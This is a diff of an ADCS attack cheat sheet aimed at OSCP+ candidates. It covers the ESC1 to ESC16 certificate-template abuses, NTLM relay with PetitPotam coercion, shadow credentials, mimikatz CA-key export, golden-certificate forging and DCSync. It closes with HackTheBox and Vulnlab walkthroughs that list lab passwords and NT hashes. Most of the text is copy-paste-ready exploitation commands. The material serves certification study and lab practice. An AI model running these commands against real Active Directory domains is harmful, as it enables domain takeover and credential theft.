@@ -1,10 +1,10 @@
-# ADCS ESC1–ESC16 — Complete OSCP+ Exam Reference
+# ADCS ESC1-ESC16 - Complete OSCP+ Exam Reference
 
 This is an exhaustive, copy-paste-ready reference covering every ADCS ESC attack path (1-16), every major tool, every troubleshooting case, and 16 real machine paths. **Bookmark every section header.**
 
 ---
 
-# PART 0 — TOOLING INSTALLATION
+# PART 0 - TOOLING INSTALLATION
 
 ## 0.1 certipy-ad (primary Linux tool, v5.x covers ESC1-ESC16)
 ```bash
@@ -99,7 +99,7 @@ wget https://raw.githubusercontent.com/dirkjanm/krbrelayx/master/printerbug.py
 
 ---
 
-# PART 1 — UNIVERSAL ENUMERATION
+# PART 1 - UNIVERSAL ENUMERATION
 
 ## 1.1 Critical OIDs (memorize)
 ```
@@ -166,7 +166,7 @@ Import-Module PSPKI; Get-CertificationAuthority | Get-CertificationAuthorityAcl
 
 ---
 
-# PART 2 — ESC1: Enrollee Supplies Subject (SAN Impersonation)
+# PART 2 - ESC1: Enrollee Supplies Subject (SAN Impersonation)
 
 **Conditions:** `msPKI-Certificate-Name-Flag` has `0x1`; `pKIExtendedKeyUsage` contains a domain-auth EKU (Client Auth/Smart Card Logon/PKINIT/Any Purpose); `msPKI-Enrollment-Flag` lacks `0x2`; `msPKI-RA-Signature=0`; low-priv principal has Enroll right.
 
@@ -220,7 +220,7 @@ nxc smb 10.0.0.10 --use-kcache
 
 ---
 
-# PART 3 — ESC2: Any Purpose EKU
+# PART 3 - ESC2: Any Purpose EKU
 
 **Conditions:** Template has `2.5.29.37.0` (Any Purpose) or empty EKU. Exploited identically to ESC3 (on-behalf-of). If `ENROLLEE_SUPPLIES_SUBJECT` is also set, collapses into ESC1.
 
@@ -236,14 +236,14 @@ certipy auth -pfx administrator.pfx
 
 ---
 
-# PART 4 — ESC3: Enrollment Agent (Two-Template)
+# PART 4 - ESC3: Enrollment Agent (Two-Template)
 
 **Conditions:** Template A has Cert Request Agent EKU (`1.3.6.1.4.1.311.20.2.1`); Template B is a v1 client-auth template (User/Machine/DomainController) the target can enroll for.
 
 ```bash
-# Step 1 — agent cert
+# Step 1 - agent cert
 certipy req -u attacker -p 'Pass!' -ca CORP-CA -template EnrollmentAgent -out attacker
-# Step 2 — on-behalf-of admin via User template
+# Step 2 - on-behalf-of admin via User template
 certipy req -u attacker -p 'Pass!' -ca CORP-CA -template User \
     -pfx attacker.pfx -on-behalf-of 'CORP\Administrator' -out administrator
 certipy auth -pfx administrator.pfx
@@ -258,27 +258,27 @@ Certify.exe request-agent --ca CA01\CORP-CA --template User --target CORP\Admini
 
 ---
 
-# PART 5 — ESC4: Vulnerable Template ACL
+# PART 5 - ESC4: Vulnerable Template ACL
 
 **Conditions:** `WriteDacl/WriteOwner/WriteProperty/GenericAll/GenericWrite/FullControl` on the template AD object. **CRITICAL: always backup first; restore after exploit (exam cleanup).**
 
 ## 5.1 Full backup-modify-exploit-restore cycle
 ```bash
-# Step 1 — BACKUP (Certipy 5.x)
+# Step 1 - BACKUP (Certipy 5.x)
 certipy template -u attacker -p 'Pass!' -dc-ip 10.0.0.10 \
     -template SecureFiles -save-configuration SecureFiles_backup.json
 # Or Certipy 4.x: -save-old (saves AND applies vulnerable config in one step)
 
-# Step 2 — write default vulnerable config (makes it ESC1)
+# Step 2 - write default vulnerable config (makes it ESC1)
 certipy template -u attacker -p 'Pass!' -dc-ip 10.0.0.10 \
     -template SecureFiles -write-default-configuration -force
 
-# Step 3 — exploit as ESC1
+# Step 3 - exploit as ESC1
 certipy req -u attacker -p 'Pass!' -ca CORP-CA -template SecureFiles \
     -upn administrator@corp.local -sid S-1-5-21-...-500
 certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10
 
-# Step 4 — RESTORE template (CRITICAL)
+# Step 4 - RESTORE template (CRITICAL)
 certipy template -u attacker -p 'Pass!' -dc-ip 10.0.0.10 \
     -template SecureFiles -write-configuration SecureFiles_backup.json -no-save
 ```
@@ -302,7 +302,7 @@ ldifde -i -f mod.ldf                                      :: import modification
 
 ---
 
-# PART 6 — ESC5: Vulnerable PKI Object ACL
+# PART 6 - ESC5: Vulnerable PKI Object ACL
 
 **Scope:** WriteDacl/WriteOwner/GenericAll on CA computer object, NTAuthCertificates, Templates Container, Enrollment Services Container, CDP, AIA, RootCA. Forest-wide compromise.
 
@@ -318,7 +318,7 @@ dsacls "CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuratio
 dsacls "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local"
 ```
 
-## 6.2 Path A — CA Computer Compromise (RBCD/Shadow Creds)
+## 6.2 Path A - CA Computer Compromise (RBCD/Shadow Creds)
 ```bash
 impacket-addcomputer 'corp.local/user:Pass' -method LDAPS -dc-ip 10.0.0.10 -computer-name 'EVIL$' -computer-pass 'EvilP@ss'
 impacket-rbcd 'corp.local/user:Pass' -dc-ip 10.0.0.10 -delegate-from 'EVIL$' -delegate-to 'CA01$' -action write
@@ -329,7 +329,7 @@ certipy shadow auto -u user@corp.local -p 'Pass!' -account 'CA01$' -dc-ip 10.0.0
 certipy ca -backup -u 'admin@corp.local' -hashes :NT -ca corp-CA -target CA01.corp.local
 ```
 
-## 6.3 Path B — NTAuthCertificates Write (Forest takeover)
+## 6.3 Path B - NTAuthCertificates Write (Forest takeover)
 ```bash
 openssl genrsa -out rogue-ca.key 4096
 openssl req -x509 -new -key rogue-ca.key -days 3650 -subj "/CN=Rogue-CA" -out rogue-ca.crt
@@ -347,14 +347,14 @@ certipy forge -ca-pfx rogue-ca.pfx -upn administrator@corp.local -sid S-1-5-21-.
 certipy auth -pfx administrator_forged.pfx
 ```
 
-## 6.4 Path C — Templates Container Write (create new vuln template)
+## 6.4 Path C - Templates Container Write (create new vuln template)
 Add a `pKICertificateTemplate` LDAP object via `ldapadd`, publish via `certipy ca -enable-template`, then exploit as ESC1.
 
 ---
 
-# PART 7 — ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2
+# PART 7 - ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2
 
-**Conditions:** CA-wide flag `EDITF_ATTRIBUTESUBJECTALTNAME2 = 0x00040000` set in policy module EditFlags. Allows ANY template to honor user-supplied SAN. **Patched by KB5014754 (May 2022)** — works alone only on unpatched DCs or with `StrongCertificateBindingEnforcement < 2`; otherwise chain with ESC9/ESC16.
+**Conditions:** CA-wide flag `EDITF_ATTRIBUTESUBJECTALTNAME2 = 0x00040000` set in policy module EditFlags. Allows ANY template to honor user-supplied SAN. **Patched by KB5014754 (May 2022)** - works alone only on unpatched DCs or with `StrongCertificateBindingEnforcement < 2`; otherwise chain with ESC9/ESC16.
 
 ## 7.1 Detection
 ```bash
@@ -378,7 +378,7 @@ Certify.exe request /ca:CA01\corp-CA /template:User /altname:administrator
 
 ---
 
-# PART 8 — ESC7: Vulnerable CA ACL (ManageCA/ManageCertificates)
+# PART 8 - ESC7: Vulnerable CA ACL (ManageCA/ManageCertificates)
 
 **Conditions:** ManageCA right grants CA admin (templates, EditFlags, officers); ManageCertificates lets you approve/deny pending requests.
 
@@ -431,19 +431,19 @@ Or via `certutil -resubmit "CA01\corp-CA" 336`.
 
 ---
 
-# PART 9 — ESC8: AD CS Web Enrollment NTLM Relay
+# PART 9 - ESC8: AD CS Web Enrollment NTLM Relay
 
 **Conditions:** Web Enrollment role enabled on CA (`/certsrv/`), no EPA/channel binding. `certipy relay` and `ntlmrelayx --adcs` attack the legacy `/certsrv/certfnsh.asp`.
 
 ## 9.1 Full relay workflow
 ```bash
-# Terminal 1 — listener (target = DC machine cert)
+# Terminal 1 - listener (target = DC machine cert)
 sudo impacket-ntlmrelayx -t http://10.0.0.20/certsrv/certfnsh.asp \
     --adcs --template DomainController -smb2support
 # OR certipy alternative (cleaner; auto-saves PFX)
 sudo certipy relay -target 10.0.0.20 -template DomainController
 
-# Terminal 2 — coerce DC to authenticate to listener
+# Terminal 2 - coerce DC to authenticate to listener
 python3 PetitPotam.py -d corp.local -u user -p 'Pass!' 10.10.14.5 10.0.0.10
 # Unauthenticated (pre-patch CVE-2021-36942):
 python3 PetitPotam.py 10.10.14.5 10.0.0.10
@@ -456,7 +456,7 @@ coercer coerce -l 10.10.14.5 -t 10.0.0.10 -u user -p 'Pass!' -d corp.local --alw
 # Decode base64 PFX from ntlmrelayx output (certipy relay auto-saves)
 echo "MIIRX..." | base64 -d > dc01.pfx
 
-# Terminal 3 — auth as DC$ → DCSync
+# Terminal 3 - auth as DC$ → DCSync
 certipy auth -pfx dc01.pfx -dc-ip 10.0.0.10
 impacket-secretsdump -hashes :DC_NT 'corp.local/DC01$@DC01.corp.local' -just-dc
 ```
@@ -466,7 +466,7 @@ impacket-secretsdump -hashes :DC_NT 'corp.local/DC01$@DC01.corp.local' -just-dc
 
 ---
 
-# PART 10 — ESC9: No Security Extension (UPN Modification)
+# PART 10 - ESC9: No Security Extension (UPN Modification)
 
 **Conditions:** (1) Template has `CT_FLAG_NO_SECURITY_EXTENSION` (`msPKI-Enrollment-Flag` 0x80000); (2) DC `StrongCertificateBindingEnforcement = 0 or 1`; (3) Attacker has GenericWrite/GenericAll on a VICTIM that can enroll.
 
@@ -478,7 +478,7 @@ certipy account read -u CONTROLLED@corp.local -p 'Pass!' -dc-ip 10.0.0.10 -user 
 # (Optional) Get VICTIM hash via shadow credentials
 certipy shadow auto -u CONTROLLED@corp.local -p 'Pass!' -dc-ip 10.0.0.10 -account VICTIM
 
-# 1) Spoof VICTIM's UPN to target — bare 'administrator', NO @domain
+# 1) Spoof VICTIM's UPN to target - bare 'administrator', NO @domain
 certipy account update -u CONTROLLED@corp.local -p 'Pass!' -dc-ip 10.0.0.10 \
     -user VICTIM -upn 'administrator'
 
@@ -487,11 +487,11 @@ certipy req -u VICTIM@corp.local -hashes :VICTIM_NT -dc-ip 10.0.0.10 \
     -ca CORP-CA -template VulnTemplate
 # Output: UPN=administrator, NO SID extension
 
-# 3) RESTORE UPN (mandatory — collisions break auth otherwise)
+# 3) RESTORE UPN (mandatory - collisions break auth otherwise)
 certipy account update -u CONTROLLED@corp.local -p 'Pass!' -dc-ip 10.0.0.10 \
     -user VICTIM -upn 'VICTIM@corp.local'
 
-# 4) Auth as administrator — MUST pass -domain (cert UPN has no @)
+# 4) Auth as administrator - MUST pass -domain (cert UPN has no @)
 certipy auth -pfx administrator.pfx -domain corp.local -dc-ip 10.0.0.10
 ```
 **`certipy account` actions:** `read | create | update | delete`. Flags: `-user TARGET -upn VAL -dns VAL -sam VAL -spns "..." -pass VAL -group "DN" -user-account-control N`.
@@ -509,9 +509,9 @@ bloodyAD -u CONTROLLED -p 'Pass!' -d corp.local --host 10.0.0.10 add shadowCrede
 
 ---
 
-# PART 11 — ESC10: Weak Certificate Mappings
+# PART 11 - ESC10: Weak Certificate Mappings
 
-**Conditions:** Two cases — (1) Kerberos: `Kdc\StrongCertificateBindingEnforcement=0`; (2) Schannel: `Schannel\CertificateMappingMethods` includes `0x4` (UPN). Plus GenericWrite on a victim with enroll rights on ANY client-auth template (no `NoSecurityExtension` needed, unlike ESC9).
+**Conditions:** Two cases - (1) Kerberos: `Kdc\StrongCertificateBindingEnforcement=0`; (2) Schannel: `Schannel\CertificateMappingMethods` includes `0x4` (UPN). Plus GenericWrite on a victim with enroll rights on ANY client-auth template (no `NoSecurityExtension` needed, unlike ESC9).
 
 ## 11.1 Case 1 (Kerberos)
 Identical workflow to ESC9 but use default `User` template:
@@ -522,7 +522,7 @@ certipy account update -u CONTROLLED -p 'Pass!' -dc-ip 10.0.0.10 -user VICTIM -u
 certipy auth -pfx administrator.pfx -domain corp.local -dc-ip 10.0.0.10
 ```
 
-## 11.2 Case 2 (Schannel — machine accounts only)
+## 11.2 Case 2 (Schannel - machine accounts only)
 Targets must lack a UPN attribute (machine accounts, built-in Administrator). Auth via Schannel/LDAPS only:
 ```bash
 certipy shadow auto -u CONTROLLED -p 'Pass!' -dc-ip 10.0.0.10 -account VICTIM
@@ -533,7 +533,7 @@ certipy auth -pfx dc.pfx -domain corp.local -dc-ip 10.0.0.10 -ldap-shell
 ```
 **LDAP shell built-ins:** `add_computer NAME [PASS]`, `add_user_to_group USER GROUP`, `change_password USER NEW`, `set_rbcd TARGET GRANTEE`, `get_laps_password COMPUTER`, `set_dontreqpreauth USER true`, `grant_control TARGET GRANTEE`, `whoami`.
 
-## 11.3 Variant — DNS mapping (computers, "Scenario B")
+## 11.3 Variant - DNS mapping (computers, "Scenario B")
 ```bash
 certipy account update -u CONTROLLED -p 'Pass!' -dc-ip 10.0.0.10 -user 'VICTIMPC$' -dns 'dc01.corp.local'
 certipy req -u 'VICTIMPC$' -hashes :HASH -ca CORP-CA -template Machine
@@ -542,7 +542,7 @@ certipy auth -pfx dc01.pfx -domain corp.local -dc-ip 10.0.0.10
 
 ---
 
-# PART 12 — ESC11: IF_ENFORCEENCRYPTICERTREQUEST Disabled (RPC Relay)
+# PART 12 - ESC11: IF_ENFORCEENCRYPTICERTREQUEST Disabled (RPC Relay)
 
 **Conditions:** CA's `InterfaceFlags` lacks `IF_ENFORCEENCRYPTICERTREQUEST` (0x00000200). Like ESC8 but relays to RPC ICPR endpoint instead of HTTP.
 
@@ -557,7 +557,7 @@ certutil -config "CA01\corp-CA" -getreg CA\InterfaceFlags
 
 ## 12.2 Exploitation
 ```bash
-# Certipy relay (cleanest — auto-saves PFX)
+# Certipy relay (cleanest - auto-saves PFX)
 sudo certipy relay -target 'rpc://10.0.0.50' -ca CORP-CA -template DomainController -dc-ip 10.0.0.10
 
 # OR ntlmrelayx
@@ -575,28 +575,28 @@ impacket-secretsdump -hashes :DC_NT 'corp.local/DC01$@10.0.0.10'
 
 ---
 
-# PART 13 — ESC12: Shell Access to CA Server (Golden Certificate)
+# PART 13 - ESC12: Shell Access to CA Server (Golden Certificate)
 
 **Conditions:** SYSTEM/admin shell on CA host, OR ManageCA + local admin via `certipy ca -backup`.
 
 ## 13.1 Extraction techniques
 ```cmd
-:: Method 1 — certutil (clean, requires admin)
+:: Method 1 - certutil (clean, requires admin)
 certutil -backupKey -f -p "Pass!" C:\bk
 certutil -exportPFX -p "Pass" My <SERIAL> ca.pfx
 
-:: Method 2 — mimikatz (non-exportable keys; CAPI/CNG patching)
+:: Method 2 - mimikatz (non-exportable keys; CAPI/CNG patching)
 mimikatz # privilege::debug
 mimikatz # crypto::capi
 mimikatz # crypto::cng
 mimikatz # crypto::certificates /systemstore:LOCAL_MACHINE /store:MY /export
 :: PFX password = "mimikatz"
 
-:: Method 3 — SharpDPAPI
+:: Method 3 - SharpDPAPI
 SharpDPAPI.exe certificates /machine
 ```
 ```bash
-# Method 4 — certipy remote backup (no shell needed if you have CA admin)
+# Method 4 - certipy remote backup (no shell needed if you have CA admin)
 certipy ca -backup -u admin@corp.local -hashes :NT -dc-ip 10.0.0.10 -ca corp-CA -target CA01.corp.local
 # Output: corp-CA.pfx
 ```
@@ -620,11 +620,11 @@ ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword "pass" \
     --NewCertPath admin.pfx --NewCertPassword "pass"
 ```
 
-**YubiHSM2 specific:** Cleartext password leak: `reg query "HKLM\SOFTWARE\Yubico\YubiHSM" /v AuthKeysetPassword`. **TPM-protected keys cannot be exfiltrated** — abuse the running CA process via `certreq`.
+**YubiHSM2 specific:** Cleartext password leak: `reg query "HKLM\SOFTWARE\Yubico\YubiHSM" /v AuthKeysetPassword`. **TPM-protected keys cannot be exfiltrated** - abuse the running CA process via `certreq`.
 
 ---
 
-# PART 14 — ESC13: OID Group Link (msDS-OIDToGroupLink)
+# PART 14 - ESC13: OID Group Link (msDS-OIDToGroupLink)
 
 **Conditions:** Template links to issuance policy OID with `msDS-OIDToGroupLink` set to a privileged Universal group's DN. Authentication adds the group SID to the PAC.
 
@@ -648,7 +648,7 @@ bloodyAD --host dc01 -d corp.local -u user -p pass set object \
 
 ---
 
-# PART 15 — ESC14: Explicit Mapping Abuse (altSecurityIdentities)
+# PART 15 - ESC14: Explicit Mapping Abuse (altSecurityIdentities)
 
 **Conditions:** Write-access to `altSecurityIdentities` on target, OR existing weak mapping (RFC822/SubjectOnly/IssuerSubject).
 
@@ -662,9 +662,9 @@ X509:<RFC822>email@x                      # weak
 X509:<S>SubjectDN                         # weak
 ```
 
-## 15.1 Scenario A — write altSecurityIdentities
+## 15.1 Scenario A - write altSecurityIdentities
 ```bash
-# 1) Get a cert (any source — request as ourselves, machine acct, etc.)
+# 1) Get a cert (any source - request as ourselves, machine acct, etc.)
 certipy req -u 'EVILPC$' -p 'Pass!' -ca corp-CA -template Machine
 
 # 2) Extract Issuer + reversed serial
@@ -680,7 +680,7 @@ bloodyAD --host dc01 -d corp.local -u attacker -p 'Pass!' \
 certipy auth -pfx EVILPC.pfx -dc-ip 10.0.0.10 -ldap-shell -user khal.drogo -domain corp.local
 ```
 
-## 15.2 Scenario B — existing X509RFC822 mapping; write target's mail
+## 15.2 Scenario B - existing X509RFC822 mapping; write target's mail
 ```bash
 bloodyAD --host dc01 -d corp.local -u attacker -p pass set object OurVictim mail -v 'victim_email@corp.local'
 certipy req -u OurVictim -p victimpass -ca corp-CA -template User    # template embeds .mail
@@ -695,11 +695,11 @@ Stifle.exe clear /object:target
 
 ---
 
-# PART 16 — ESC15: SchemaVersion 1 Application Policies (EKUwu / CVE-2024-49019)
+# PART 16 - ESC15: SchemaVersion 1 Application Policies (EKUwu / CVE-2024-49019)
 
 **Conditions:** Template has `msPKI-Template-Schema-Version=1`, `Enrollee Supplies Subject` flag set, attacker has Enroll, CA unpatched (Nov 2024 patch). Default vulnerable: WebServer, CrossCertificationAuthority, etc.
 
-## 16.1 Path A — Direct Client Auth Injection
+## 16.1 Path A - Direct Client Auth Injection
 ```bash
 certipy req -u attacker -p 'Pass!' -dc-ip 10.0.0.10 -target ca.corp.local \
     -ca corp-CA -template WebServer \
@@ -714,7 +714,7 @@ certipy req ... -upn administrator@corp.local -sid 'S-1-5-21-...-500' -applicati
 certipy auth -pfx administrator.pfx
 ```
 
-## 16.2 Path B — Cert Request Agent injection (chains into ESC3)
+## 16.2 Path B - Cert Request Agent injection (chains into ESC3)
 ```bash
 certipy req -u attacker -p 'Pass!' -ca corp-CA -template WebServer \
     -application-policies '1.3.6.1.4.1.311.20.2.1'    # Cert Request Agent
@@ -730,9 +730,9 @@ Certify.exe request /ca:DC01\corp-CA /template:WebServer /altname:administrator@
 
 ---
 
-# PART 17 — ESC16: Security Extension Disabled Domain-Wide
+# PART 17 - ESC16: Security Extension Disabled Domain-Wide
 
-**Conditions:** CA has `1.3.6.1.4.1.311.25.2` in `policy\DisableExtensionList` → ALL issued certs lack SID extension. DC `StrongCertificateBindingEnforcement < 2`. More permissive than ESC9 — affects every template.
+**Conditions:** CA has `1.3.6.1.4.1.311.25.2` in `policy\DisableExtensionList` → ALL issued certs lack SID extension. DC `StrongCertificateBindingEnforcement < 2`. More permissive than ESC9 - affects every template.
 
 ## 17.1 Detection
 ```bash
@@ -767,7 +767,7 @@ certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10 -username administrator -do
 
 ---
 
-# PART 18 — SHADOW CREDENTIALS
+# PART 18 - SHADOW CREDENTIALS
 
 **Concept:** Write `msDS-KeyCredentialLink` on target (need GenericWrite/GenericAll/AddKeyCredentialLink). Embed your public key, then PKINIT in as them. Requires DC functional level 2016+. BH edge: `AddKeyCredentialLink`.
 
@@ -805,7 +805,7 @@ Whisker.exe add /target:VICTIM /domain:corp.local /dc:dc01 /path:out.pfx /passwo
 
 ---
 
-# PART 19 — UnPAC-the-Hash
+# PART 19 - UnPAC-the-Hash
 
 ```bash
 # Method 1: certipy automatic (default behavior of `auth`)
@@ -825,9 +825,9 @@ Rubeus.exe asktgt /user:USER /certificate:user.pfx /password:PfxPass /domain:cor
 
 ---
 
-# PART 20 — PASSTHECERT (PKINIT FALLBACK)
+# PART 20 - PASSTHECERT (PKINIT FALLBACK)
 
-**Use when:** `KDC_ERR_PADATA_TYPE_NOSUPP` (DC has no PKINIT cert) — Schannel-LDAPS bind instead of Kerberos.
+**Use when:** `KDC_ERR_PADATA_TYPE_NOSUPP` (DC has no PKINIT cert) - Schannel-LDAPS bind instead of Kerberos.
 
 ```bash
 # Convert PFX
@@ -867,11 +867,11 @@ PassTheCert.exe --server dc01.corp.local --cert-path admin.pfx --elevate --targe
 PassTheCert.exe --server dc01.corp.local --cert-path admin.pfx --add-computer --computer-name EVIL$ --computer-password Pass
 PassTheCert.exe --server dc01.corp.local --cert-path admin.pfx --rbcd --target DC01$ --sid <attacker_sid>
 ```
-**Cleaner alternative:** `certipy auth -pfx admin.pfx -dc-ip 10.0.0.10 -ldap-shell` — same shell, no PFX conversion needed.
+**Cleaner alternative:** `certipy auth -pfx admin.pfx -dc-ip 10.0.0.10 -ldap-shell` - same shell, no PFX conversion needed.
 
 ---
 
-# PART 21 — CERT FORMAT CONVERSIONS
+# PART 21 - CERT FORMAT CONVERSIONS
 
 ```bash
 # PFX → PEM combined (no encryption)
@@ -881,7 +881,7 @@ openssl pkcs12 -in cert.pfx -out cert.pem -nodes
 openssl pkcs12 -in cert.pfx -nokeys  -out cert.crt
 openssl pkcs12 -in cert.pfx -nocerts -nodes -out key.pem
 
-# PEM → PFX (Microsoft-compatible CSP — REQUIRED for Rubeus)
+# PEM → PFX (Microsoft-compatible CSP - REQUIRED for Rubeus)
 openssl pkcs12 -in combined.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
 # OpenSSL 3 legacy fallback:
 openssl pkcs12 -legacy -in cert.pfx -out cert.pem -nodes
@@ -904,7 +904,7 @@ certipy cert -pfx user.pfx -text                              # dump cert info
 
 ---
 
-# PART 22 — PKINIT TROUBLESHOOTING MATRIX
+# PART 22 - PKINIT TROUBLESHOOTING MATRIX
 
 | Error | Cause | Fix |
 |---|---|---|
@@ -941,9 +941,9 @@ faketime '2025-08-12 21:06:29' certipy req ...           # explicit timestamp
 
 ---
 
-# PART 23 — MACHINE WALKTHROUGHS
+# PART 23 - MACHINE WALKTHROUGHS
 
-## 23.1 HTB Escape (10.10.11.202) — ESC1 | CA: `sequel-DC-CA` | Template: `UserAuthentication`
+## 23.1 HTB Escape (10.10.11.202) - ESC1 | CA: `sequel-DC-CA` | Template: `UserAuthentication`
 ```bash
 # Anonymous SMB → Public.pdf has PublicUser:GuestUserCantWrite1
 smbclient -N //10.10.11.202/Public
@@ -961,7 +961,7 @@ certipy auth -pfx administrator.pfx -dc-ip 10.10.11.202
 evil-winrm -i 10.10.11.202 -u administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE
 ```
 
-## 23.2 HTB Manager (10.10.11.236) — ESC7 | CA: `manager-DC01-CA` | Template: `SubCA`
+## 23.2 HTB Manager (10.10.11.236) - ESC7 | CA: `manager-DC01-CA` | Template: `SubCA`
 ```bash
 nxc smb 10.10.11.236 -u guest -p '' --rid-brute 10000
 nxc smb 10.10.11.236 -u users.txt -p users.txt --no-bruteforce --continue-on-success    # operator:operator
@@ -979,7 +979,7 @@ sudo ntpdate manager.htb
 certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236
 ```
 
-## 23.3 HTB Certified (10.10.11.41) — ESC9 | CA: `certified-DC01-CA` | Template: `CertifiedAuthentication`
+## 23.3 HTB Certified (10.10.11.41) - ESC9 | CA: `certified-DC01-CA` | Template: `CertifiedAuthentication`
 ```bash
 # judith.mader:judith09 → BloodHound: WriteOwner on Management
 python3 owneredit.py -action write -new-owner judith.mader -target Management \
@@ -1003,7 +1003,7 @@ certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a12955
 certipy auth -pfx administrator.pfx -dc-ip 10.10.11.41 -domain certified.htb
 ```
 
-## 23.4 HTB EscapeTwo (10.10.11.51) — ESC4→ESC1 | CA: `sequel-DC01-CA` | Template: `DunderMifflinAuthentication`
+## 23.4 HTB EscapeTwo (10.10.11.51) - ESC4→ESC1 | CA: `sequel-DC01-CA` | Template: `DunderMifflinAuthentication`
 ```bash
 # rose:KxEPkKe6R8su (assumed breach) → MSSQL via XLSX → sa:MSSQL_P@ssw0rd! → ryan via reuse
 certipy shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account ca_svc -dc-ip 10.10.11.51
@@ -1022,7 +1022,7 @@ certipy template -u ca_svc -hashes :3b181b914e7a9d5508ea1e20bc2b7fce \
     -template DunderMifflinAuthentication -write-configuration DunderMifflinAuthentication.json
 ```
 
-## 23.5 HTB Authority (10.10.11.222) — ESC1+MAQ | CA: `AUTHORITY-CA` | Template: `CorpVPN`
+## 23.5 HTB Authority (10.10.11.222) - ESC1+MAQ | CA: `AUTHORITY-CA` | Template: `CorpVPN`
 ```bash
 # SMB Development → ansible vault → john ansible2john → PWM admin → LDAP cleartext
 sudo responder -I tun0      # captures svc_ldap:lDaP_1n_th3_cle4r!
@@ -1041,7 +1041,7 @@ python3 PassTheCert/Python/passthecert.py -action ldap-shell \
 # > add_user_to_group svc_ldap "Domain Admins"
 ```
 
-## 23.6 HTB Fluffy — ESC16 | CA: `fluffy-DC01-CA` | Template: `User` (any)
+## 23.6 HTB Fluffy - ESC16 | CA: `fluffy-DC01-CA` | Template: `User` (any)
 ```bash
 # CVE-2025-24071 .library-ms in IT$ share → Responder NTLMv2 → p.agila:prometheusx-303
 bloodyAD --host 10.10.11.69 -d fluffy.htb -u p.agila -p prometheusx-303 \
@@ -1067,12 +1067,12 @@ evil-winrm -i 10.10.11.69 -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
 ```
 **`certipy ≥ 5.0.0` REQUIRED** for ESC16 detection. Faketime mandatory.
 
-## 23.7 HTB TombWatcher — ESC15 (EKUwu) | CA: `tombwatcher-CA-1` | Template: `WebServer`
+## 23.7 HTB TombWatcher - ESC15 (EKUwu) | CA: `tombwatcher-CA-1` | Template: `WebServer`
 ```bash
 # After AD Recycle Bin restore of cert_admin and password reset to Maveric#!$!$!!
 certipy find -target dc01.tombwatcher.htb -u cert_admin -p 'Maveric#!$!$!!' -vulnerable -stdout
 
-# Path B (preferred — chains into ESC3)
+# Path B (preferred - chains into ESC3)
 certipy req -u cert_admin -p 'Maveric#!$!$!!' -dc-ip 10.10.11.72 \
     -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template WebServer \
     -application-policies 'Certificate Request Agent'
@@ -1089,7 +1089,7 @@ Enable-ADAccount -Identity cert_admin
 Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString "Maveric#!\$!\$!!" -AsPlainText -Force)
 ```
 
-## 23.8 Vulnlab Sendai — ESC4→ESC1 | CA: `sendai-DC-CA` | Template: `SendaiComputer`
+## 23.8 Vulnlab Sendai - ESC4→ESC1 | CA: `sendai-DC-CA` | Template: `SendaiComputer`
 ```bash
 # Password spray Clifford.Davey:RFmoB2WplgE_3p; ca-operators FullControl on SendaiComputer template
 certipy template -u clifford.davey -p RFmoB2WplgE_3p -dc-ip 10.10.x.x \
@@ -1101,13 +1101,13 @@ certipy req -u clifford.davey -p RFmoB2WplgE_3p -dc-ip 10.10.x.x \
 certipy auth -pfx administrator.pfx -dc-ip 10.10.x.x
 ```
 
-## 23.9 HTB Search — Client cert auth (no ESC)
+## 23.9 HTB Search - Client cert auth (no ESC)
 PFX `staff.pfx` extracted from SMB → cracked with `pfx2john` (password `misspissy`) → imported into Firefox → PSWA shell at `https://research.search.htb/PSWA`. Pure client-cert auth, not ESC.
 
-## 23.10 HTB Cascade — `cascadeLegacyPwd` LDAP attribute (no ADCS)
+## 23.10 HTB Cascade - `cascadeLegacyPwd` LDAP attribute (no ADCS)
 Anonymous LDAP exposes `cascadeLegacyPwd` (custom attribute, base64) on `r.thompson` → `rY4n5eva`. Not ADCS.
 
-## 23.11 HTB Coder — ESC4 alt (PSPKI New-ADCSTemplate)
+## 23.11 HTB Coder - ESC4 alt (PSPKI New-ADCSTemplate)
 ```powershell
 # As e.black (PKI Admins) on box:
 import-module .\ADCSTemplate.psm1
@@ -1120,7 +1120,7 @@ certipy req -u e.black@coder.htb -p ypOSJXPqlDOxxbQSfEERy300 \
 certipy auth -pfx administrator.pfx -dc-ip 10.10.11.207
 ```
 
-## 23.12 HTB Certificate (10.10.11.71) — ESC3+Golden Cert | CA: `Certificate-LTD-CA`
+## 23.12 HTB Certificate (10.10.11.71) - ESC3+Golden Cert | CA: `Certificate-LTD-CA`
 ```bash
 # Lion.SK:!QAZ2wsx (Domain CRA Managers) via PCAP Kerberos crack
 certipy req -u Lion.SK -p '!QAZ2wsx' -target certificate.htb -ca Certificate-LTD-CA -template Delegated-CRA
@@ -1134,7 +1134,7 @@ certipy forge -ca-pfx ca.pfx -upn administrator@certificate.htb -subject 'CN=Adm
 certipy auth -pfx administrator_forged.pfx -dc-ip 10.10.11.71
 ```
 
-## 23.13 HTB Scepter — ESC14 (altSecurityIdentities)
+## 23.13 HTB Scepter - ESC14 (altSecurityIdentities)
 ```bash
 # d.baker has password-reset on a.carter; a.carter has WriteProperty(mail) on d.baker
 # h.brown's altSecurityIdentities = X509:<RFC822>h.brown@scepter.htb
@@ -1145,7 +1145,7 @@ certipy req -u d.baker@scepter.htb -hashes :18b5fb0d99e7a475316213c15b6f22ce \
 certipy auth -pfx d.baker.pfx -dc-ip 10.10.11.65 -domain scepter.htb -username h.brown
 ```
 
-## 23.14 PG Nagoya — Silver Ticket (no real ADCS)
+## 23.14 PG Nagoya - Silver Ticket (no real ADCS)
 ```bash
 impacket-lookupsid 'nagoya-industries.com/fiona.clark:Summer2023'@10.10.x.x   # → domain SID
 impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C \
